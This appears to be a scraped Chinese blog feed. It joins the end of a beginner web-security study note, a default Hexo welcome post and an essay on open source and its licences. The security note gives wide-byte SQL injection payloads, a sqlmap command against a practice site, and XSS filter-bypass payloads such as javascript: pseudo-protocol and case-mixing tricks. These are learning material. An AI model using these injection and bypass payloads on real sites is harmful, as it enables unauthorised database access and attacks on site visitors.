&lt;li&gt;手工注入&lt;br&gt;
可以使用 union 联合注入方法&lt;br&gt;
比如：?id=1% aa’ order by 1 --+&lt;br&gt;
?id=1%df’ order by 1 --+&lt;br&gt;
 这里表名 table_name 的值必须转换成 16 进制，如果不用 16 进制就得用引号包裹，当有 addlashes 函数就会转义引号，就会导致查询失败，使用 16 进制避免了这个问题。&lt;/li&gt;
&lt;li&gt;相类似操作进行爆库、爆表、爆值&lt;/li&gt;
&lt;li&gt;sqlmap&lt;br&gt;
sqlmap -u “&lt;a href=&#34;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df&#34;&gt;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1�&lt;/a&gt;’”&lt;/li&gt;
&lt;li&gt;脚本实现注入&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;&lt;span id=&#34;xss&#34;&gt; XSS&lt;/span&gt;&lt;/h2&gt;
&lt;h3&gt;&lt;span id=&#34;xss漏洞介绍&#34;&gt; （xss）漏洞介绍&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;跨站脚本攻击 (Cross Site Scripting)，为了不和层叠样式表 (Cascading Style Sheets, CSS) 的缩写混淆，故将跨站脚本攻击缩写为 XSS。恶意攻击者往 Web 页面里插入恶意 Script 代码，当用户浏览该页之时，嵌入其中 Web 里面的 Script 代码会被执行，从而达到恶意攻击用户的目的。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;XSS 漏洞普遍和流行的原因&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;Web 浏览器本身的设计是不安全的。&lt;/li&gt;
&lt;li&gt;输入与输出是 Web 应用程序最基本的交互，在这过程之中若没做好安全防护&lt;/li&gt;
&lt;li&gt;程序员之间的水平参差不齐，很少有人受过正规的安全培训。&lt;/li&gt;
&lt;li&gt;不管是开发人员还是安全工程师，很多都没有真正意识到 XSS 漏洞的危害，导致这类漏洞普遍受到忽视。&lt;/li&gt;
&lt;li&gt;触发跨站脚本的方式非常简单，只要向 HTML 代码中注入脚本即可，而且执行此类攻击的手段众多&lt;/li&gt;
&lt;li&gt;黑客也就有了更广阔的空间发动 XSS 攻击。&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;XSS 可能带来的危害&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;网络钓鱼，包括盗取各类用户账号；&lt;/li&gt;
&lt;li&gt;窃取用户 cookies 资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作；&lt;/li&gt;
&lt;li&gt;劫持用户（浏览器）会话，从而执行任意操作，例如进行非法转账、强制发表日志、发送电子邮件等&lt;/li&gt;
&lt;li&gt;强制弹出广告页面、刷流量等；&lt;/li&gt;
&lt;li&gt;网页挂马；&lt;/li&gt;
&lt;li&gt;进行恶意操作，例如任意篡改页面信息、删除文章等；&lt;/li&gt;
&lt;li&gt;进行大量的客户端攻击，如 DDoS 攻击；&lt;/li&gt;
&lt;li&gt;获取客户端信息，例如用户的浏览历史、真实 IP、开放端口等；&lt;/li&gt;
&lt;li&gt;控制受害者机器向其他网站发起攻击；&lt;br&gt;
10. 结合其他漏洞，如 CSRF 漏洞，实施进一步作恶；&lt;br&gt;
11. 提升用户权限，包括进一步渗透网站；&lt;br&gt;
12. 传播跨站脚本蠕虫&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;&lt;span id=&#34;反射型xss&#34;&gt; 反射型（xss）&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;前端 -&amp;gt; 后端 -&amp;gt; 前端&lt;br&gt;
反射型 XSS 的利用一般是攻击者通过特定手法（比如利用电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者单击这些专门设计的链接的时候，恶意 JavaScript 代码会直接在受害者主机上的浏览器执行。&lt;/p&gt;
&lt;p&gt;此类 XSS 通常出现在网站的搜索栏、用户登入口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。&lt;/p&gt;
&lt;p&gt;随着用户的安全意识增加，黑客们也会对 url 进行编码达到迷惑用户点击的目的。&lt;/p&gt;
&lt;h3&gt;&lt;span id=&#34;存储型xss&#34;&gt; 存储型（xss）&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;持久型跨站脚本也等于存储型跨站脚本，比反射型跨站脚本更具威胁性，并且可能影响到 Web 服务器自身的安全。&lt;/p&gt;
&lt;p&gt;此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意 JavaScript 代码上传或存储到漏洞服务器中，只要受害者浏览包含此恶意 JavaScript 代码的页面就会执行恶意代码。&lt;/p&gt;
&lt;p&gt;攻击流程：前端 -&amp;gt; 后端 -&amp;gt; 数据库 -&amp;gt; 后端 -&amp;gt; 前端&lt;/p&gt;
&lt;h3&gt;&lt;span id=&#34;发掘xss&#34;&gt; 发掘（XSS）&lt;/span&gt;&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;黑盒技术：通过对网站可疑地方入手，注入恶意代码攻击&lt;/li&gt;
&lt;li&gt;白盒技术：观察源代码以及关联文件代码，分析调用机制以及过滤机制。&lt;/li&gt;
&lt;li&gt;灰盒技术：黑盒和白盒的结合。&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;攻的角度&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;如果用户可以随心所欲地引入 &amp;lt; &amp;gt; 等标记，那么他就能操作一个 HTML 标签，然后通过&lt;scirpt&gt;标签就能任意插入由 JavaScript 或 Vbscript 编写的恶意脚本代码。&lt;br&gt;
eg:&lt;script&gt;alert(‘XSS’); &lt;/script&gt;&lt;/scirpt&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;假设用户不能构造自己的 HTML 标记，但是他们还可以使用其他，例如 HTML 标签的属性值。很多 HTML 标记中的属性都支持 javascript:[code] 伪协议的形式，这个特殊的协议类型声明了 URL 的主体是任意的 JavaScript 代码，由 JavaScript 的解释器运行。&lt;br&gt;
eg:&lt;table background=&#34;javascript:alert(/xss/)&#34;&gt;&lt;/table&gt;&lt;img&gt;src=“javascript:alert(‘XSS’);”&amp;gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;如果 XSS Filter 仅仅把敏感的输入字符列入黑名单处理，如对敏感字 javascript 而言，用户可以利用空格、回车和 Tab 键绕过限制。(自我认为，是 JS 的语法比较宽松，导致后续开发出现这个不可避免的漏洞)&lt;br&gt;
eg:&lt;img src=&#34;/2022/04/13/vulnerability/%E5%B0%8F%E7%99%BD%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0/xss/)&#34; width=&#34;100&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;对标签属性值转码&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;HTML 的属性值支持 ASCII 码 …&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;还可以把、等字符插入到 JavaScript 或 Vbscript 的头部，另外，Tab 符的 ASCII 码 、换行符的 、回车符的 可以被插入到代码中任意地方。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;
&lt;p&gt;产生自己的事件&lt;br&gt;
 JavaScript 与 HTML 之间的交互是通过事件来实现的，事件就是用户或浏览器自身执行的某种动作，比如 click、mouseover、load 等，而响应事件的函数就叫做事件处理函数（或事件侦听器）。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;利用 CSS 跨站剖析&lt;br&gt;
 XSS 跨站脚本的另一个载体是 CSS 样式表，使用 CSS 样式表执行 JavaScript 具有隐蔽、灵活多变等特点，但是 CSS 样式表有一个很大的缺点：各浏览器之间不能通用，甚者可能同一浏览器不同版本之间都不能通用 (expression、@import 和 link 方式…)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;扰乱过滤规则&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;转换大小写&lt;br&gt;
&lt;img src=&#34;javascript:alert(0);&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;大小写混淆&lt;br&gt;
&lt;img src=&#34;jaVasCript:alert(0);&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;不用双引号，而是使用单引号&lt;br&gt;
&lt;img src=&#34;/2022/04/13/vulnerability/%E5%B0%8F%E7%99%BD%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0/javascript:alert(0);&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;不使用引号&lt;br&gt;
&lt;img src=&#34;/2022/04/13/vulnerability/%E5%B0%8F%E7%99%BD%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0/javascript:alert(0);&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;…&lt;/p&gt;
&lt;ol start=&#34;8&#34;&gt;
&lt;li&gt;拆分跨站法&lt;br&gt;
拆分法跨站的核心是：把跨站代码拆分成几个片段，然后再使用某种方式将其拼凑在一起执行&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;&lt;span id=&#34;nosql&#34;&gt; Nosql&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;它和 sql 注入漏洞差不多，只不过 nosql 适用于大型数据库，语法规则与 sql 略有差别。&lt;br&gt;
数据库：MongoDB&lt;/p&gt;
&lt;hr class=&#34;footnotes-sep&#34;&gt;
&lt;section class=&#34;footnotes&#34;&gt;
&lt;ol class=&#34;footnotes-list&#34;&gt;
&lt;li id=&#34;fn1&#34; class=&#34;footnote-item&#34;&gt;&lt;p&gt;GFs &lt;a href=&#34;#fnref1&#34; class=&#34;footnote-backref&#34;&gt;↩︎&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id=&#34;fn2&#34; class=&#34;footnote-item&#34;&gt;&lt;p&gt;A-H &lt;a href=&#34;#fnref2&#34; class=&#34;footnote-backref&#34;&gt;↩︎&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;

 &lt;p&gt;Welcome to &lt;a href=&#34;https://hexo.io/&#34;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&#34;https://hexo.io/docs/&#34;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&#34;https://hexo.io/docs/troubleshooting.html&#34;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&#34;https://github.com/hexojs/hexo/issues&#34;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;&lt;span id=&#34;quick-start&#34;&gt; Quick Start&lt;/span&gt;&lt;/h2&gt;
&lt;h3&gt;&lt;span id=&#34;create-a-new-post&#34;&gt; Create a new post&lt;/span&gt;&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo new &lt;span class=&#34;string&#34;&gt;&amp;quot;My New Post&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/writing.html&#34;&gt;Writing&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;&lt;span id=&#34;run-server&#34;&gt; Run server&lt;/span&gt;&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo server&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/server.html&#34;&gt;Server&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;&lt;span id=&#34;generate-static-files&#34;&gt; Generate static files&lt;/span&gt;&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo generate&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/generating.html&#34;&gt;Generating&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;&lt;span id=&#34;deploy-to-remote-sites&#34;&gt; Deploy to remote sites&lt;/span&gt;&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo deploy&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;More info: &lt;a href=&#34;https://hexo.io/docs/one-command-deployment.html&#34;&gt;Deployment&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;&lt;span id&gt; &lt;/span&gt;&lt;/h2&gt;

 &lt;h2&gt;&lt;span id=&#34;导入&#34;&gt; 导入&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;软件正在慢条斯理地吞噬世界，开源正在慢条斯理地吞噬软件业。&lt;/p&gt;
&lt;p&gt;软件正在吞噬世界？是的，对于购物、吃饭、健身、交停车费都需要使用软件的年代，对于平均每人每天都要花费 5 到 6 个小时使用手机软件的年代，有什么理由不相信软件正在吞噬整个世界呢。&lt;/p&gt;
&lt;p&gt;开源正在吞噬软件业？是的，因为在软件越来越富裕的年代（也即软件不再稀缺），不开源的软件，最终是没法和开源软件竞争的。举个简单例子，如果有人要在很多个文件加密软件中选择一个使用，在功能和价格都差不多的情况下，选择开源的还是闭源的？当然要选择开源的，因为谁知道闭源的软件中，会不会有后门？&lt;/p&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;  
&lt;h2&gt;&lt;span id=&#34;例子&#34;&gt; 例子&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;开源的成功程度，或者说开源的渗透程度，从中国银行业的广泛采用就可以看出来，银行作为一个在 IT 方面相当谨慎和保守的行业，在 2012 年（一个大约的年限）之前对开源基本上不屑一顾，使用的基本上全是商业软件（这里是指专有软件），他们认为商业软件更专业、质量更高、更可信赖、更有保障，他们中不少人视开源软件为异类，对其功能、性能、安全性表示担忧，最重要的是，他们担心开源软件出问题后找不到 “原厂” 解决问题和 “承担责任”。&lt;/p&gt;
&lt;p&gt;然而就在 2012 年以后，银行业逐渐增加了开源的使用比例，这里面有很多原因，最重要的一个原因是，在 Linux 面世 20 年后，很多开源软件已经成为比商业软件更好的存在，以至于咨询商、集成商、开发商们在为银行提供解决方案时，所拿出的最佳方案已经是基于开源的方案，银行（作为甲方）已经无力拒绝。比如，如今当一个银行要建设其自用的云平台时，在咨询和调研一大圈下来，他几乎一定会选择基于 OpenStack 的方案，如果想使用容器技术，就几乎一定会选择容器编排软件 kubernetes，这时，已经顾不上有没有 “原厂” 了（事实上还是有服务商兜底），因为没有太多更好的选择了。&lt;/p&gt;
&lt;p&gt;银行虽然还在使用 Vmware、Oracle、Websphere、Weblogic，但是 KVM、Mysql、Apache、Nginx 的渗透已经越来越严重，多数银行的 Linux 主机数量早已超过了 Windows 服务器，因为 Linux 早已成为整个世界的主流的服务器操作系统，而且还有像 Redhat 这样的商业支持，为什么不使用呢。&lt;/p&gt;
&lt;p&gt;如果有条件，你可以实地调查一下，各家银行的 IT 部门，在最近 5 年内，已经不得不正面开源这种 “新事物” 给他们带来的 “问题”，因为对开源的引入、使用和运维，显然和以往闭源软件有明显不同，他们开始写出开源软件使用管理办法，并指定专门处室来负责管理。&lt;/p&gt;
&lt;p&gt;而那些有先见之明的企业（尤其是互联网企业），早已组建了开源办公室，早已把自己的整个系统建立在开源软件之上，并且早已在开源世界投入了大量的资金和人员，毫无疑问，他们也早已从开源中获得了巨大的收益。&lt;/p&gt;
&lt;h2&gt;&lt;span id=&#34;开源取得成功的七大理念&#34;&gt; 开源取得成功的七大理念&lt;/span&gt;&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;完全自主&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;程序员想要开源的操作系统，想要开源的编辑器，还想要开源的编译器、开源的浏览器、开源的数据库、开源的 web server、开源的云环境、开源的虚拟机软件、开源的大数据工具、开源的人工智能软件。。。总之，如果一切都开源了，这就是程序员感觉最自由和最自主的环境，这就是程序员的理想。&lt;/p&gt;
&lt;p&gt;如果很多人都有这样的需求，而又有人能把它实现，那这件事就必然会发生。&lt;/p&gt;
&lt;p&gt;当程序员们想要开源操作系统的时候，Tanenbaum 带着 Minix 出现了，当人们希望它有更多的特性时，Linus 拿出了 Linux，当人们需要 web server 时，NCSA 拿出了 Apache，作者一开始开源自己的代码时，并没有想太多，可能仅仅就是想说：“兄弟们，看看我写的这个东西怎么样？你们试试用一下？有啥问题，或者有什么新想法，欢迎给我发邮件！”&lt;/p&gt;
&lt;p&gt;在需求和供应的动力下，开源从底层的操作系统开始，充满了整个开发环境和中间件，一直到最上层应用，只要是人们想要的东西，黑客就会把它们实现，如果有一样东西还没有开源，那一定还不是黑客很想要的东西，或者是，他们认为这个东西没有必要开源（比如赖以赚钱和生存的东西，比如比较客户化的东西）。&lt;/p&gt;
&lt;p&gt;所以，我们看到，操作系统 Linux、Android；编辑器 Vim、Emacs、Atom、Brackets、VS code，版本管理系统 SVN、Git；数据库 MySQL、MongoDB、Redis、Postgres；大数据平台 Hadoop、Elasticsearch、Hbase、Spark；Web 服务器 Apache、Nginx、Node.js、Tomcat；DevOps 工具 Jenkins、Maven、Ansible、Chef；虚拟化软件 KVM、Xen、Docker、Kubernetes，如雨后春笋般应运而生，这些列出的和没有列出的开源软件，形成了一个完整的软件生态环境，黑客们已经生活在一个很幸福的时代，他几乎是想要什么就有什么，而几乎在所有的 IT 企业和大型非 IT 企业里，你都能看到这些开源软件的身影。&lt;/p&gt;
&lt;p&gt;开源，其实是程序员送给程序员的礼物。&lt;/p&gt;
&lt;p&gt;因为真正需要源码的人，是程序员，真正能写出源码的人，也是程序员。&lt;br&gt;
2. 高度开放&lt;/p&gt;
&lt;p&gt;最开放的情况莫过于 “任何人能干任何事”（anyone can hack anything），也即没有任何事情可以阻止人们运行该产品，获取其源码、复制其源码、修改其源码，推进其向不同方向演进，并声称是该产品。&lt;/p&gt;
&lt;p&gt;这可是太过开放了，以至于拿到他人源码后，“克隆” 或者 “山寨” 出一个产品将没有任何法律层面的压力，为什么开源会开放到如此地步？&lt;/p&gt;
&lt;p&gt;一方面，在源码已经开放的前提下，你事实上很难阻止别人克隆、修改你的代码并换个名字发布。虽然程序员通常不会这么做，但他们不愿意有限制，在一个普遍宽松的环境下，如果你限制太多，程序员就不太会参与你的项目。&lt;/p&gt;
&lt;p&gt;另一方面，这是一个鼓励充分竞争的世界，如果程序员们就项目的方向产生分歧，而又无法达成一致，异见者就可以分叉出来自立门户。比如，EGCS 分叉自 GCC，OpenSSH 脱胎于走向商业化前的 SSH，Veracrypt 派生自 Truecrypt，再如近年来比较著名的事件：一些人不认可 BTC 的方向，分叉出来 BCH，然后又有人不认可 BCH，分叉出来 BSV，虽然这个过程中有很多争吵，但没有人可以阻止这些。&lt;br&gt;
3. 自发自治&lt;/p&gt;
&lt;p&gt;所谓开源社区，指的是所有关心、参与、支持、帮助某个开源项目的人的集合。&lt;/p&gt;
&lt;p&gt;社区里的人，是自发组织在一起的。“其中 90% 是用户，他们只是搭顺风车或是凑凑热闹，9% 的人积极参与、提交 bug、回答问题，这是‘贡献者’，1% 的人指导并控制项目的走向，委派任务和做决策，这是‘维护者’，或者简单的说，他们是领导者。”&lt;/p&gt;
&lt;p&gt;1、领导者（Leader）：比如 Linus Torvalds，作为内核的创始人，毫无疑问是该项目的最高领导者，在理论上，对 Linux 内核的任何事务都拥有最终话语权。在另外的一些项目中，可能有一个或多个人共同负责，如 Node.js 项目采用的是核心技术委员会机制（the Core Technical Committee）。&lt;/p&gt;
&lt;p&gt;2、维护者（Maintainer）：领导者会将一些决策和模块直接委托给维护者，维护者还可以将其中部分工作再委托给下一个层级的维护者。例如，Linus Torvalds 手下就有若干位内核的维护者，负责不同的模块。&lt;/p&gt;
&lt;p&gt;3、提交者（Committer）：有些开源项目会设置一组可以直接提交代码到主干的人，他们已经证明了自己可以胜任工作并且靠谱，而且不再需要提交维护者去进行审核。但提交者对代码没有最终的决定权，维护者或项目的领导者如果发现了什么，可以将提交的内容打回去。&lt;/p&gt;
&lt;p&gt;4、贡献者（Developer 或 Contributor）：贡献者可以做很多事，比如帮助解答用户的问题，贡献代码或文档，在邮件列表中参与讨论，也可以提交代码 committer。与前面的角色相比，贡献者对于代码的权力要小一些。&lt;/p&gt;
&lt;p&gt;5、使用者（User）：用户为项目提供了目标，并帮助项目持续进化，作为社区成员，他们最有价值的部分是提出需求、报告缺陷、提出建议。&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;自下而上&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;自下而上是大自然最普遍的法则，开源作为一个从草根社会发展起来的事物，必然会遵循这个法则。&lt;/p&gt;
&lt;p&gt;在开源世界里，至少可以从技术、生态、成就三个层面来观察这一现象。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;技术&lt;br&gt;
纵观开源历史，那些非常富有创意的软件，一开始都是作者脑海中一个不太清晰、朦朦胧胧的想法，然后在作者能力和经验的基础上，通过代码一步步明晰起来的。开源项目在第一次露面时，大多数情况下只是初步可以运行，然后通过其富有创意的特性和前景，吸引更多的程序员关注和贡献。&lt;/li&gt;
&lt;li&gt;生态&lt;br&gt;
开源软件之间形成的关系，也是自下而上的，先有了语言、编译器、操作系统，然后在操作系统提供的各种功能的基础上（比如文件系统、内存系统、硬件驱动等），黑客做出了实用工具（binutils），做出外壳（Shell），做出了代码管理工具、集成开发环境，做出了数据库、Webserver、浏览器，做出了虚拟机，做出了 javascript，做出了包管理工具，做出各种应用开发框架和组件，做出了大数据、云技术，做出了各种面向最终用户的应用。程序员总是先做出底层的东西，然后才做出上层的东西，而且总是先有实践，才有了理论，总是先有代码，才有了设计模式、架构体系、软件工程这些东西。&lt;/li&gt;
&lt;li&gt;成就&lt;br&gt;
绝大多数黑客，一开始都是小打小闹，从简陋的程序开始起家，并没有什么宏大的想法，Linus 一开始也只是自己玩玩看（《Just For Fun》），并没有想着要怎么改变世界，说自己 “如果当时真的知道从头建立一个操作系统的难度，肯定是不会有勇气去做的”12。而到了 1999 年，Linus 在 “The Linux Edge” 一文中提到：“Linux 现在有数百万用户、数千名开发者和正在增长的市场，Linux 被用在嵌入式系统中，用在机器人系统中，用在航天飞机上，我想说我知道这些都会发生，这些都是统领世界计划的一部分（that it’s all part of the plan for world domination）”，虽然，这也许只是一种诙谐的表达。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;自由竞争&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;开源，是一个靠实力说话的世界。&lt;/p&gt;
&lt;p&gt;开源软件在竞争什么？竞争的是谁的软件好使，谁的评价更高，以及，最终，是谁获得了更多的市场份额。&lt;/p&gt;
&lt;p&gt;软件在竞争，个人也在竞争。&lt;/p&gt;
&lt;p&gt;个人竞争的法则很简单，如果你的贡献 —— 当然主要是指代码的贡献 —— 得到了同侪认可，你就会获得声誉和权力。&lt;br&gt;
6. 赢在声誉&lt;br&gt;
 7. 社区赋能&lt;/p&gt;
&lt;h2&gt;&lt;span id=&#34;开源盈利&#34;&gt; 开源？盈利？&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;开源怎么赢利？抛开开源的商业模式不提，我想，只要我们开源的代码真正创造了价值，有人用，那我和团队就是最大的赢家。如果 30 年后，还有人在用 TDengine, 哪怕只是其中一个模块，其中一个函数，那就是对我们两年多日夜奋战的最大肯定，就是给我这个程序员的最大回报。&lt;/p&gt;
&lt;p&gt;如果你发现什么问题，我只会高兴，不睡觉都想尽快去解决它。如果喜欢，更欢迎参与到我们这个项目中来。五年之内，世界上 90% 以上的数据都将是物联网采集的数据，如果我们一起开发出一个极为高效的数据处理引擎来处理这些数据，而且为全球开发者所使用，你是贡献者之一，那是一个多么自豪的事情。”&lt;/p&gt;
&lt;h2&gt;&lt;span id=&#34;关于开源&#34;&gt; 关于开源&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;开源软件在追求 “自由” 的同时，不能牺牲程序员的利益，否则将会影响程序员的创造激情，因此世界上现在有 60 多种被开源促进组织（Open Source Initiative）认可的开源许可协议来保证开源工作者的权益。&lt;/p&gt;
&lt;p&gt;开源协议规定了你在使用开源软件时的权利和责任，也就是规定了你可以做什么，不可以做什么。&lt;/p&gt;
&lt;p&gt;开源协议虽然不一定具备法律效力，但是当涉及软件版权纠纷时，开源协议也是非常重要的证据之一。&lt;/p&gt;
&lt;p&gt;对于准备编写一款开源软件的开发人员，也非常建议先了解一下当前最热门的开源许可协议，选择一个合适的开源许可协议来最大限度保护自己的软件权益。&lt;/p&gt;
&lt;h2&gt;&lt;span id=&#34;常见开源协议&#34;&gt; 常见开源协议&lt;/span&gt;&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;GNU GPL（GNU General Public License，GNU 通用公共许可证）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;只要软件中包含了遵循 GPL 协议的产品或代码，该软件就必须也遵循 GPL 许可协议，也就是必须开源免费，不能闭源收费，因此这个协议并不适合商用软件。&lt;/p&gt;
&lt;p&gt;遵循 GPL 协议的开源软件数量极其庞大，包括 Linux 系统在内的大多数的开源软件都是基于这个协议的。&lt;/p&gt;
&lt;p&gt;GPL 开源协议的主要特点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;复制自由：允许把软件复制到任何人的电脑中，并且不限制复制的数量。&lt;/li&gt;
&lt;li&gt;传播自由：允许软件以各种形式进行传播。&lt;/li&gt;
&lt;li&gt;收费传播：允许在各种媒介上出售该软件，但必须提前让买家知道这个软件是可以免费获得的；因此，一般来讲，开源软件都是通过为用户提供有偿服务的形式来盈利的。&lt;/li&gt;
&lt;li&gt;修改自由：允许开发人员增加或删除软件的功能，但软件修改后必须依然基于 GPL 许可协议授权。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;BSD（Berkeley Software Distribution，伯克利软件发布版）协议&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;BSD 协议基本上允许用户 “为所欲为”，用户可以使用、修改和重新发布遵循该许可的软件，并且可以将软件作为商业软件发布和销售，前提是需要满足下面三个条件：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果再发布的软件中包含源代码，则源代码必须继续遵循 BSD 许可协议。&lt;/li&gt;
&lt;li&gt;如果再发布的软件中只有二进制程序，则需要在相关文档或版权文件中声明原始代码遵循了 BSD 协议。&lt;/li&gt;
&lt;li&gt;不允许用原始软件的名字、作者名字或机构名称进行市场推广。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;BSD 对商业比较友好，很多公司在选用开源产品的时候都首选 BSD 协议，因为可以完全控制这些第三方的代码，甚至在必要的时候可以修改或者二次开发。&lt;br&gt;
3. Apache 许可证版本（Apache License Version）协议&lt;/p&gt;
&lt;p&gt;Apache 和 BSD 类似，都适用于商业软件。Apache 协议在为开发人员提供版权及专利许可的同时，允许用户拥有修改代码及再发布的自由。&lt;/p&gt;
&lt;p&gt;现在热门的 Hadoop、Apache HTTP Server、MongoDB 等项目都是基于该许可协议研发的，程序开发人员在开发遵循该协议的软件时，要严格遵守下面的四个条件：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;该软件及其衍生品必须继续使用 Apache 许可协议。&lt;/li&gt;
&lt;li&gt;如果修改了程序源代码，需要在文档中进行声明。&lt;/li&gt;
&lt;li&gt;若软件是基于他人的源代码编写而成的，则需要保留原始代码的协议、商标、专利声明及其他原作者声明的内容信息。&lt;/li&gt;
&lt;li&gt;如果再发布的软件中有声明文件，则需在此文件中标注 Apache 许可协议及其他许可协议。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;4&#34;&gt;
